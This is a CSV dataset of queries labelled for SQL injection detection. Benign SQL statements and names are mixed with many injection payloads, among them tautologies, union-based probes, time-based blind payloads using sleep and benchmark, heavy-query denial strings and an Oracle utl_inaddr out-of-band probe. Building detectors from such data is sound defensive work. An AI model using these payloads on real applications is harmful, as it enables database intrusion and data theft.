Query,Label
"1' where 1895 = 1895 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'iari' = 'iari",1
’ or ‘1’ = ’1,1
SELECT MIN ( could ) AS which FROM extra,0
SELECT * FROM engineer FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM goes,0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
nina,0
1' ) ) as rxxd where 5049 = 5049,1
"1'+ ( select 'ixza' where 4374 = 4374 union all select null,null,null--",1
SELECT MIN ( flies ) AS discovery FROM related,0
1 ) ) as pzoo where 8036 = 8036 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1
"1"" ) where 1024 = 1024 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1
"1"" ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( ""hbgr"" like ""hbgr",1
"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
"SELECT * FROM bite WHERE explanation NOT IN ( 'pig', 'station', 'western' )",0
"-1510' ) ) ) union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1
bernad fermoselle,0
SELECT silence FROM caught UNION SELECT upward FROM except ORDER BY one,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( '%' = '",1
"1%' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( '%' = '",1
SELECT SupplierName FROM Suppliers,0
serpiginoso,0
1' ) ) as hxxm where 3792 = 3792 and sleep ( 5 ) #,1
"1"" ) ) as oiqr where 4073 = 4073 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT * FROM body WHERE completely BETWEEN '1996-07-01' AND '1996-07-31',0
shorwan,0
SELECT government ( s ) FROM repeat SELECT vegetable ( s ),0
"1' where 2373 = 2373 union all select null,null#",1
blasinda,0
SELECT * FROM were WHERE flew = 'die' AND ( bright = 'cave' OR quick = 'to' ),0
end and 'blit' = 'blit,1
-8745' ) as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1
SELECT AVG ( Price ) FROM empty,0
"SELECT column_name ( s ) FROM scene,office",0
erny1,0
"1%' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and '%' = '",1
"SELECT * FROM uncle WHERE bound IN ( 'end', 'tea', 'feel' )",0
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""%"" = """,1
"SELECT caught, win+ ', ' + seed+ ' ' + machinery+ ', ' + floor AS waste FROM consider",0
"1' ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'hfqz' = 'hfqz",1
select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
"1 union all select null,null,null,null,null,null,null--",1
"SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper FROM sharp",0
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # hkrp",1
SELECT TOP 3 * FROM they,0
